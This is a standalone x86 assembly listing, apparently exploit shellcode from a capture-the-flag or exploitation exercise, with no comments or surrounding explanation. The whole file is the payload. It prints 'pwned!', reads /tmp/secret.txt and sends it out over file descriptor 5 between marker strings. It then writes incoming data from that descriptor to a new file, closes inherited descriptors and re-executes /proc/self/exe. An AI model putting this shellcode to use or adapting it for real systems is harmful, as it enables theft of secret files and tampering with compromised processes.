.intel_syntax noprefix
.text
.global _start
_start:
    jmp   real
strings:
    .ascii "pwned!"
    .byte 0
    .ascii "/tmp/secret.txt"
    .byte 0
    .ascii "image.jpg"
    .byte 0
    .ascii "5-kocicek.jpg"
    .byte 0
    .ascii "/proc/self/exe"
    .byte 0
    .ascii ">>>SECRET<<<"
    .byte 0
    .ascii ">>>END<<<"
    .byte 0
real:
    mov   esi, esp
    xor   eax, eax
    mov   al, 4
    xor   ebx, ebx
    mov   bl, 1
    lea   ecx, [esi + 2]
    xor   edx, edx
    mov   dl, 6
    int   0x80
    xor   eax, eax
    mov   al, 5
    lea   ebx, [esi + 9]
    xor   ecx, ecx
    xor   edx, edx
    int   0x80
    mov   edi, eax
    xor   eax, eax
    mov   al, 4
    mov   ebx, 5
    lea   ecx, [esi + 64]
    mov   edx, 12
    int   0x80
sloop:
    xor   eax, eax
    mov   al, 3
    mov   ebx, edi
    lea   ecx, [esi - 0x400]
    xor   edx, edx
    mov   dh, 2
    int   0x80
    test  eax, eax
    jz    sdend
    mov   edx, eax
    xor   eax, eax
    mov   al, 4
    xor   ebx, ebx
    mov   bl, 1
    lea   ecx, [esi - 0x400]
    int   0x80
    xor   eax, eax
    mov   al, 4
    mov   ebx, 5
    lea   ecx, [esi - 0x400]
    int   0x80
    jmp   sloop
sdend:
    xor   eax, eax
    mov   al, 4
    mov   ebx, 5
    lea   ecx, [esi + 77]
    mov   edx, 9
    int   0x80
    xor   eax, eax
    mov   al, 5
    lea   ebx, [esi + 35]
    mov   ecx, 0x241
    mov   edx, 0x1a4
    int   0x80
    mov   ebp, eax
iloop:
    xor   eax, eax
    mov   al, 3
    mov   ebx, 5
    lea   ecx, [esi - 0x400]
    xor   edx, edx
    mov   dh, 2
    int   0x80
    test  eax, eax
    jz    done
    js    iloop
    mov   edx, eax
    xor   eax, eax
    mov   al, 4
    mov   ebx, ebp
    lea   ecx, [esi - 0x400]
    int   0x80
    jmp   iloop
done:
    mov   ebx, 3
Lclose:
    xor   eax, eax
    mov   al, 6
    int   0x80
    inc   ebx
    cmp   ebx, 0x1f
    jne   Lclose
    xor   eax, eax
    push  eax
    lea   ebx, [esi + 49]
    push  ebx
    mov   ecx, esp
    xor   edx, edx
    mov   al, 11
    int   0x80
    xor   eax, eax
    mov   al, 1
    xor   ebx, ebx
    int   0x80
